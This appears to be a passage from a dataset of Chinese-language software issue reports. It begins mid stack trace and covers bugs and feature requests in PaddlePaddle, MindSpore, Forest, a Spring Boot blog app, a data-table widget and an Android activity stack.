0x7fa8344e2e34 paddle::SocketChannel::read() Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;: @ 0x7fa8344e3320 paddle::SocketChannel::readMessage() Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf61b221c3 start_thread Mon Jan 15 15:25:36 2018[1,28]&lt;stderr&gt;:*** Aborted at 1516001136 (unix time) try ""date -d @1516001136"" if you are using GNU date *** Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;: @ 0x7fa8362076e4 paddle::ParameterClient2::sendParallel() Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x0 (unknown) Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;: @ 0x7fa8345ec57c _ZNSt6thread5_ImplISt12_Bind_simpleIFZN6paddle14SyncThreadPool5startEvEUliE_mEEE6_M_runEv Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;: @ 0x7fa8344e4156 paddle::ProtoClient::recv() Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;: @ 0x7fa8362076e4 paddle::ParameterClient2::sendParallel() Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;: @ 0x7fa8345ec57c _ZNSt6thread5_ImplISt12_Bind_simpleIFZN6paddle14SyncThreadPool5startEvEUliE_mEEE6_M_runEv Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;: @ 0x7fa8848c48a0 execute_native_thread_routine"
调用backbone预训练模型出错,"backbone模型是分类模型，需要fine_tune的模型是detection模型，后者在前者模型的基础上有额外的层，问题是加载backbone预训练的参数出错。 保存backbone参数： 加载backbone参数： 报错如下： 上面这一段中，conv2d_39这一层应该是属于fine_tune模型的，并不是backbone模型的。   <code>: fluid.io.save_params(exe, model_path, main_program=classification_train_prog) fluid.io.load_params(exe, pretrained_model, main_program=detection_train_prog) paddle.fluid.core_avx.EnforceNotMet: Invoke operator load error. Python Callstacks: File ""/home/x/anaconda3/envs/paddle/lib/python3.6/site-packages/paddle/fluid/framework.py"", line 1771, in append_op attrs=kwargs.get(""attrs"", None)) File ""/home/x/anaconda3/envs/paddle/lib/python3.6/site-packages/paddle/fluid/io.py"", line 633, in load_vars 'file_path': os.path.join(load_dirname, new_var.name) File ""/home/x/anaconda3/envs/paddle/lib/python3.6/site-packages/paddle/fluid/io.py"", line 611, in load_vars filename=filename) File ""/home/x/anaconda3/envs/paddle/lib/python3.6/site-packages/paddle/fluid/io.py"", line 699, in load_params filename=filename) File ""train.py"", line 95, in train fluid.io.load_params(exe, pretrained_model, main_program=train_prog) C++ Callstacks: Cannot open file classification/output/0/conv2d_39.w_0 for load op at [/paddle/paddle/fluid/operators/load_op.h:37] PaddlePaddle Call Stacks: 0 0x7ff6dde4a890p void paddle::platform::EnforceNotMet::Init&lt;char const*&gt;(char const*, char const*, int) + 352 ......"
反向传播出错,"platform: AIStudio version: 2.0.1   <code>: Traceback (most recent call last): File ""train_v2.py"", line 65, in &lt;module&gt; main() File ""train_v2.py"", line 59, in main loss.backward() File ""&lt;/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/decorator.py:decorator-gen-114&gt;"", line 2, in backward File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/wrapped_decorator.py"", line 25, in __impl__ return wrapped_func(*args, **kwargs) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/framework.py"", line 225, in __impl__ return func(*args, **kwargs) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dygraph/varbase_patch_methods.py"", line 177, in backward self._run_backward(framework._dygraph_tracer(), retain_graph) RuntimeError: (NotFound) Output(Scale@GRAD) and Output(Bias@GRAD) must be null or not be null at same time. But now, has Scale@Grad=[0], has Bias@GRAD=[1] [Hint: Expected (has_scale_grad == has_bias_grad) == true, but received (has_scale_grad == has_bias_grad):0 != true:1.] (at /paddle/paddle/fluid/operators/batch_norm_op.cc:477)"
DataLoader多线程数据读取不起效果,"PaddlePaddle 2.1.0 我印象中，num_workers设置多少就会使用多少个CPU读取数据，但是现在我设置的是8条线程读取，但是有个2个在使用，这两个刚好就是我使用GPU的数量，如果我使用单卡计算，那么他就变成了一个。num_workers设置根本不起效果，导致数据读取速度很慢。GPU使用率不高。 读取代码：   <code>: 进禠USER PR NI VIRT RES SHR ?%CPU %MEM TIME+ COMMAND 529 psdz 20 0 22.387g 3.028g 921248 R 100.3 9.7 5:09.53 python 528 psdz 20 0 21.878g 3.031g 926972 R 100.0 9.7 5:09.57 python 747 psdz 20 0 10.580g 413204 209456 S 1.7 1.3 0:01.82 python 720 psdz 20 0 10.576g 409096 208024 S 1.3 1.2 0:01.82 python 611 psdz 20 0 10.579g 412340 208004 S 0.3 1.3 0:01.77 python train_dataset = Dataset(args.train_manifest, args.dataset_vocab, mean_std_filepath=args.mean_std_path, min_duration=args.min_duration, max_duration=args.max_duration) batch_sampler = paddle.io.DistributedBatchSampler(train_dataset, batch_size=args.batch_size, shuffle=True) train_loader = DataLoader(dataset=train_dataset, collate_fn=collate_fn, batch_sampler=batch_sampler, num_workers=8)"
"Post请求体是multipart/form-data, 报错 ""Multipart body must have at least one part.""","Forest: 1.5.2-BETA3 Backend: okhttp 该问题是如何引起的？ 升级至 有一个请求体是 ,但是每次请求都报错,也不打印请求日志. 搜了下之前的 issue, 说是要添加.这个现在是要自己手动添加了吗?因为我看之前的 版本的日志是有的.   <code>: 1.5.0-RC5 1.5.2-BETA3 Post multipart/form-data Multipart body must have at least one part. boundary 1.5.0-RC5"
求助，项目启动不起来,大佬大佬，求助，使用mysql数据库启动不起来怎么办   <code>: 2019-12-18 10:30:42.098 INFO 15566 --- [ restartedMain] com.zaxxer.hikari.HikariDataSource : HikariPool-1 - Shutdown completed. 2019-12-18 10:30:42.128 ERROR 15566 --- [ restartedMain] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'shiroFilterFactoryBean' defined in class path resource [com/mtons/mblog/config/ShiroConfiguration.class]: Unsatisfied dependency expressed through method 'shiroFilterFactoryBean' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'securityManager' defined in class path resource [org/apache/shiro/spring/config/web/autoconfigure/ShiroWebAutoConfiguration.class]: Unsatisfied dependency expressed through method 'securityManager' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'accountRealm': Unsatisfied dependency expressed through field 'userService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'userServiceImpl': Unsatisfied dependency expressed through field 'userRepository'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'userRepository': Cannot create inner bean '(inner bean)#3d6f1761' of type [org.springframework.orm.jpa.SharedEntityManagerCreator] while setting bean property 'entityManager'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)#3d6f1761': Cannot resolve reference to bean 'entityManagerFactory' while setting constructor argument; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'flywayInitializer' defined in class path resource [org/springframework/boot/autoconfigure/flyway/FlywayAutoConfiguration$FlywayConfiguration.class]: Invocation of init method failed; nested exception is org.flywaydb.core.api.FlywayException: Validate failed: Detected failed migration to version 3.2 (update) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:769) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:509) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1288) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1127) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:538) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:498) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:204) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.context.support.PostProcessorRegistrationDelegate.registerBeanPostProcessors(PostProcessorRegistrationDelegate.java:240) ~[spring-context-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.context.support.AbstractApplicationContext.registerBeanPostProcessors(AbstractApplicationContext.java:707) ~[spring-context-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:531) ~[spring-context-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:142) ~[spring-boot-2.1.2.RELEASE.jar:2.1.2.RELEASE] at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:775) [spring-boot-2.1.2.RELEASE.jar:2.1.2.RELEASE] at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) [spring-boot-2.1.2.RELEASE.jar:2.1.2.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:316) [spring-boot-2.1.2.RELEASE.jar:2.1.2.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1260) [spring-boot-2.1.2.RELEASE.jar:2.1.2.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1248) [spring-boot-2.1.2.RELEASE.jar:2.1.2.RELEASE] at com.mtons.mblog.BootApplication.main(BootApplication.java:18) [classes/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_191] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_191] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_191] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_191] at org.springframework.boot.devtools.restart.RestartLauncher.run(RestartLauncher.java:49) [spring-boot-devtools-2.1.2.RELEASE.jar:2.1.2.RELEASE] Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'securityManager' defined in class path resource [org/apache/shiro/spring/config/web/autoconfigure/ShiroWebAutoConfiguration.class]: Unsatisfied dependency expressed through method 'securityManager' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'accountRealm': Unsatisfied dependency expressed through field 'userService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'userServiceImpl': Unsatisfied dependency expressed through field 'userRepository'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'userRepository': Cannot create inner bean '(inner bean)#3d6f1761' of type [org.springframework.orm.jpa.SharedEntityManagerCreator] while setting bean property 'entityManager'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)#3d6f1761': Cannot resolve reference to bean 'entityManagerFactory' while setting constructor argument; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'flywayInitializer' defined in class path resource [org/springframework/boot/autoconfigure/flyway/FlywayAutoConfiguration$FlywayConfiguration.class]: Invocation of init method failed; nested exception is org.flywaydb.core.api.FlywayException: Validate failed: Detected failed migration to version 3.2 (update) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:769) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:509) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1288) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1127) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:538) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:498) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:277) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1244) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1164) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:857) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:760) ~[spring-beans-5.1.4.RELEASE.jar:5.1.4.RELEASE] ... 24 common frames omitted
[CT][MS][Unique]CPU环境下float64类型计算错误,"CPU环境下输入float64类型时，ms结果错误 / 硬件环境: CPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 输出float64类型，将标杆与ms的输出打印出来 对标一致   <code>: 用例： def test_p_unique_input_float64(): x = Tensor(np.sort(np.random.randn(325)), mindspore.float64) fact = UniqueFactory(x) fact.forward_cmp() ops层： def forward_cmp(self): out_tf, idx_tf = self.forward_tensorflow_impl() output = self.forward_mindspore_impl() out_me = output[0].asnumpy() idx_me = output[1].asnumpy() print(""out_tf:--------------------"", out_tf) print(""idx_tf:--------------------"", idx_tf) print(""out_me:--------------------"", out_me) print(""idx_me:--------------------"", idx_me) allclose_nparray(out_tf, out_me, self.loss, self.loss) allclose_nparray(idx_me, idx_tf, self.loss, self.loss) 打印结果日志处查看 out_tf:-------------------- [-3.13563189 -2.72086129 -2.47964981 -2.47581197 -2.40028635 -2.3521713 -2.29879372 -2.28170635 -2.25876335 -2.23831056 -2.22802139 -2.22610314 -2.16027943 -2.08644174 -2.06810894 -2.05176805 -2.02141504 -2.02109088 -1.9447764 -1.94004471 -1.9067595 -1.88752655 -1.74746828 -1.73807563 -1.7140333 -1.71078588 -1.68564568 -1.67498609 -1.63832008 -1.61944836 -1.56266448 -1.4655045 -1.46200041 -1.4542539 -1.40513369 -1.3966617 -1.35832994 -1.34098921 -1.26851476 -1.25727526 -1.24200305 -1.21269913 -1.20239312 -1.15161418 -1.14785187 -1.13734001 -1.11857981 -1.09037402 -1.06712693 -1.04717331 -1.03985056 -1.01926792 -0.99564538 -0.98511672 -0.98183141 -0.97205781 -0.96434281 -0.96344662 -0.95677164 -0.92883813 -0.92289968 -0.91851306 -0.89295146 -0.87727437 -0.8720933 -0.85181451 -0.85166114 -0.83352288 -0.80848169 -0.80292914 -0.80106533 -0.79565253 -0.77968003 -0.77203571 -0.72424852 -0.70923734 -0.69374847 -0.68903727 -0.67642631 -0.66822204 -0.64998858 -0.64875635 -0.64336819 -0.63459304 -0.63369252 -0.62734964 -0.62248991 -0.59548523 -0.58363731 -0.5788712 -0.56996875 -0.56821533 -0.56599344 -0.55980073 -0.55298442 -0.54574087 -0.53085917 -0.51964007 -0.49745391 -0.48927794 -0.48167624 -0.4777739 -0.47162191 -0.45603127 -0.45220866 -0.44946381 -0.43918079 -0.43866403 -0.43703568 -0.42539793 -0.41414878 -0.40951533 -0.40818982 -0.40372879 -0.40369121 -0.39986903 -0.39112095 -0.38538167 -0.38457563 -0.38151917 -0.38147003 -0.34865816 -0.33321226 -0.32797972 -0.31801395 -0.30898882 -0.29972141 -0.29593879 -0.29212156 -0.28637125 -0.26608938 -0.26033454 -0.25645797 -0.25339285 -0.25236099 -0.23884483 -0.2329135 -0.22853334 -0.22480076 -0.2061122 -0.20057872 -0.1890988 -0.18849346 -0.18715754 -0.17794419 -0.15365072 -0.15046598 -0.14929162 -0.14659838 -0.13519827 -0.12954383 -0.12612896 -0.11964988 -0.11473894 -0.11467564 -0.10279678 -0.08869302 -0.0873648 -0.08363414 -0.07905859 -0.07787944 -0.07635422 -0.06510427 -0.05219927 -0.04216907 0.00875412 0.01115032 0.01615546 0.0500327 0.05039811 0.05580367 0.06166154 0.06398153 0.07238369 0.093344 0.09486697 0.09591906 0.13040867 0.1334258 0.13899553 0.1422003 0.15061664 0.15224076 0.15372485 0.15789967 0.16305578 0.16850897 0.17125478 0.17425792 0.18523987 0.18744563 0.1911242 0.21616341 0.21703766 0.21774136 0.22224158 0.22314168 0.24472123 0.2460685 0.26994941 0.27392442 0.30620998 0.30943211 0.31708508 0.3183673 0.32115786 0.34782882 0.35354781 0.36363454 0.37769568 0.38428373 0.38624244 0.38804832 0.39548463 0.4015337 0.4117203 0.42165685 0.4310322 0.43475293 0.44142977 0.4439149 0.45919777 0.46463181 0.46736359 0.46993987 0.54438915 0.54502781 0.56154163 0.59988412 0.6104149 0.62842403 0.63259976 0.63484941 0.63509933 0.63918474 0.64272472 0.64306502 0.65425059 0.65461538 0.68550989 0.68859878 0.70333607 0.71078984 0.72301452 0.73444789 0.75463744 0.76424329 0.7719495 0.78227868 0.7843078 0.78772246 0.78801073 0.7944333 0.82768885 0.83901864 0.85639552 0.86309923 0.87799421 0.88940912 0.89169081 0.91243178 0.91508769 0.91739376 0.93100211 0.93685454 0.94616083 0.95170798 0.96156999 0.96741875 0.97909017 1.02011919 1.02673389 1.03956085 1.04247913 1.04787281 1.05038852 1.0535615 1.05389102 1.06060008 1.08497608 1.1028093 1.12068507 1.12981472 1.13187007 1.14666488 1.14924731 1.15491492 1.16908395 1.1784215 1.21983505 1.23154548 1.28121237 1.29816945 1.30999018 1.35012914 1.40479014 1.4098687 1.41371466 1.45169836 1.46081395 1.50085622 1.52683486 1.56239001 1.57110258 1.62689823 1.629775 1.67124565 1.69401376 1.69631165 1.69802055 1.73043167 1.73751343 1.83926494 1.84515486 1.85013216 1.86624906 1.94846802 1.97460807 2.04566711 2.08667752 2.43880796 2.55224911 2.66639121 2.67801715 2.9051408 ] idx_tf:-------------------- [ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324] out_me:-------------------- [-3.13563189 -2.72086129 -2.47964981 -2.47581197 -2.40028635 -2.3521713 -2.29879372 -2.28170635 -2.25876335 -2.23831056 -2.22802139 -2.22610314 -2.16027943 -2.08644174 -2.06810894 -2.05176805 -2.02141504 -2.02109088 -1.9447764 -1.94004471 -1.9067595 -1.88752655 -1.74746828 -1.73807563 -1.7140333 -1.71078588 -1.68564568 -1.67498609 -1.63832008 -1.61944836 -1.56266448 -1.4655045 -1.46200041 -1.4542539 -1.40513369 -1.3966617 -1.35832994 -1.34098921 -1.26851476 -1.25727526 -1.24200305 -1.21269913 -1.20239312 -1.15161418 -1.14785187 -1.13734001 -1.11857981 -1.09037402 -1.06712693 -1.04717331 -1.03985056 -1.01926792 -0.99564538 -0.98511672 -0.98183141 -0.97205781 -0.96434281 -0.96344662 -0.95677164 -0.92883813 -0.92289968 -0.91851306 -0.89295146 -0.87727437 -0.8720933 -0.85181451 -0.85166114 -0.83352288 -0.80848169 -0.80292914 -0.80106533 -0.79565253 -0.77968003 -0.77203571 -0.72424852 -0.70923734 -0.69374847 -0.68903727 -0.67642631 -0.66822204 -0.64998858 -0.64875635 -0.64336819 -0.63459304 -0.63369252 -0.62734964 -0.62248991 -0.59548523 -0.58363731 -0.5788712 -0.56996875 -0.56821533 -0.56599344 -0.55980073 -0.55298442 -0.54574087 -0.53085917 -0.51964007 -0.49745391 -0.48927794 -0.48167624 -0.4777739 -0.47162191 -0.45603127 -0.45220866 -0.44946381 -0.43918079 -0.43866403 -0.43703568 -0.42539793 -0.41414878 -0.40951533 -0.40818982 -0.40372879 -0.40369121 -0.39986903 -0.39112095 -0.38538167 -0.38457563 -0.38151917 -0.38147003 -0.34865816 -0.33321226 -0.32797972 -0.31801395 -0.30898882 -0.29972141 -0.29593879 -0.29212156 -0.28637125 -0.26608938 -0.26033454 -0.25645797 -0.25339285 -0.25236099 -0.23884483 -0.2329135 -0.22853334 -0.22480076 -0.2061122 -0.20057872 -0.1890988 -0.18849346 -0.18715754 -0.17794419 -0.15365072 -0.15046598 -0.14929162 -0.14659838 -0.13519827 -0.12954383 -0.12612896 -0.11964988 -0.11473894 -0.11467564 -0.10279678 -0.08869302 -0.0873648 -0.08363414 -0.07905859 -0.07787944 -0.07635422 -0.06510427 -0.05219927 -0.04216907 0.00875412 0.01115032 0.01615546 0.0500327 0.05039811 0.05580367 0.06166154 0.06398153 0.07238369 0.093344 0.09486697 0.09591906 0.13040867 0.1334258 0.13899553 0.1422003 0.15061664 0.15224076 0.15372485 0.15789967 0.16305578 0.16850897 0.17125478 0.17425792 0.18523987 0.18744563 0.1911242 0.21616341 0.21703766 0.21774136 0.22224158 0.22314168 0.24472123 0.2460685 0.26994941 0.27392442 0.30620998 0.30943211 0.31708508 0.3183673 0.32115786 0.34782882 0.35354781 0.36363454 0.37769568 0.38428373 0.38624244 0.38804832 0.39548463 0.4015337 0.4117203 0.42165685 0.4310322 0.43475293 0.44142977 0.4439149 0.45919777 0.46463181 0.46736359 0.46993987 0.54438915 0.54502781 0.56154163 0.59988412 0.6104149 0.62842403 0.63259976 0.63484941 0.63509933 0.63918474 0.64272472 0.64306502 0.65425059 0.65461538 0.68550989 0.68859878 0.70333607 0.71078984 0.72301452 0.73444789 0.75463744 0.76424329 0.7719495 0.78227868 0.7843078 0.78772246 0.78801073 0.7944333 0.82768885 0.83901864 0.85639552 0.86309923 0.87799421 0.88940912 0.89169081 0.91243178 0.91508769 0.91739376 0.93100211 0.93685454 0.94616083 0.95170798 0.96156999 0.96741875 0.97909017 1.02011919 1.02673389 1.03956085 1.04247913 1.04787281 1.05038852 1.0535615 1.05389102 1.06060008 1.08497608 1.1028093 1.12068507 1.12981472 1.13187007 1.14666488 1.14924731 1.15491492 1.16908395 1.1784215 1.21983505 1.23154548 1.28121237 1.29816945 1.30999018 1.35012914 1.40479014 1.4098687 1.41371466 1.45169836 1.46081395 1.50085622 1.52683486 1.56239001 1.57110258 1.62689823 1.629775 1.67124565 1.69401376 1.69631165 1.69802055 1.73043167 1.73751343 1.83926494 1.84515486 1.85013216 1.86624906 1.94846802 1.97460807 2.04566711 2.08667752 2.43880796 2.55224911 2.66639121 2.67801715 2.9051408 ] idx_me:-------------------- [ 4294967296 12884901890 21474836484 30064771078 38654705672 47244640266 55834574860 64424509454 73014444048 81604378642 90194313236 98784247830 107374182424 115964117018 124554051612 133143986206 141733920800 150323855394 158913789988 167503724582 176093659176 184683593770 193273528364 201863462958 210453397552 219043332146 227633266740 236223201334 244813135928 253403070522 261993005116 270582939710 279172874304 287762808898 296352743492 304942678086 313532612680 322122547274 330712481868 339302416462 347892351056 356482285650 365072220244 373662154838 382252089432 390842024026 399431958620 408021893214 416611827808 425201762402 433791696996 442381631590 450971566184 459561500778 468151435372 476741369966 485331304560 493921239154 502511173748 511101108342 519691042936 528280977530 536870912124 545460846718 554050781312 562640715906 571230650500 579820585094 588410519688 597000454282 605590388876 614180323470 622770258064 631360192658 639950127252 648540061846 657129996440 665719931034 674309865628 682899800222 691489734816 700079669410 708669604004 717259538598 725849473192 734439407786 743029342380 751619276974 760209211568 768799146162 777389080756 785979015350 794568949944 803158884538 811748819132 820338753726 828928688320 837518622914 846108557508 854698492102 863288426696 871878361290 880468295884 889058230478 897648165072 906238099666 914828034260 923417968854 932007903448 940597838042 949187772636 957777707230 966367641824 974957576418 983547511012 992137445606 1000727380200 1009317314794 1017907249388 1026497183982 1035087118576 1043677053170 1052266987764 1060856922358 1069446856952 1078036791546 1086626726140 1095216660734 1103806595328 1112396529922 1120986464516 1129576399110 1138166333704 1146756268298 1155346202892 1163936137486 1172526072080 1181116006674 1189705941268 1198295875862 1206885810456 1215475745050 1224065679644 1232655614238 1241245548832 1249835483426 1258425418020 1267015352614 1275605287208 1284195221802 1292785156396 1301375090990 1309965025584 1318554960178 1327144894772 1335734829366 1344324763960 1352914698554 1361504633148 1370094567742 1378684502336 1387274436930 324 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0] FAILED"
数据表格能否支持行右键事件，便于事件下 dropdown.render() 然后操作行对象！,数据表格能否支持行右键事件，便于事件下 dropdown.render() 然后操作 行对象 ！ 还有数据表格接口对象能否支持取指定行对象，以便于无需触发事件即可得到行对象进行行操作（不重载，更新行等情况）！ （如有其他更好解决方案，麻烦说下！）   <code>: commonMember
看了退出的事件代码,"为什么要break 这样只关闭了第一个activity   <code>: for (int i = 0, size = activityStack.size(); i &lt; size; i++) { if (null != activityStack.get(i)) { finishActivity(activityStack.get(i)); break; } }"
[CT][MS][Acos]grad test report precision error when dtype is cp64 at GPU,"算子acos 在GPU后端， complex64 反向计算有精度问题 / 硬件环境: /device /GPU : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph GPU后端执行测试用例 计算结果正确， 对标通过   <code>: def test_p_acos_input_20x7x9x88_complex64(): input_x_real = np.random.uniform(low=-1.0, high=1.0, size=(20, 7, 9, 88)).astype(np.float32) input_x_imag = np.random.uniform(low=-1.0, high=1.0, size=(20, 7, 9, 88)).astype(np.float32) input_x = Tensor((input_x_real + 1j * input_x_imag).astype(np.complex64)) fact = ACosMock(inputs=[input_x]) fact.forward_cmp() &gt; fact.grad_cmp() def test_p_acos_input_20x7x9x88_complex64(): input_x_real = np.random.uniform(low=-1.0, high=1.0, size=(20, 7, 9, 88)).astype(np.float32) input_x_imag = np.random.uniform(low=-1.0, high=1.0, size=(20, 7, 9, 88)).astype(np.float32) input_x = Tensor((input_x_real + 1j * input_x_imag).astype(np.complex64)) fact = ACosMock(inputs=[input_x]) fact.forward_cmp() &gt; fact.grad_cmp() E AssertionError: E data_expected_std:[-3.1640239-3.0305357j] E 